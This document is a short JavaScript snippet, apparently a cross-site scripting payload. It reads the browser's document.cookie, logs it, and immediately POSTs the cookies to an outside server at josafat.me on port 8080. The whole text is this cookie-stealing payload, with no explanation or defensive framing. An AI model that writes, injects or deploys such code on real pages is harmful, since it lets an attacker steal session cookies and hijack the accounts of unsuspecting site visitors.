console.log(document.cookie);
async function SendCookie() {
  const response = await fetch("http://josafat.me:8080", {
    body: `${document.cookie}`,
    method: "POST",
  });
}

SendCookie().then(() => {});
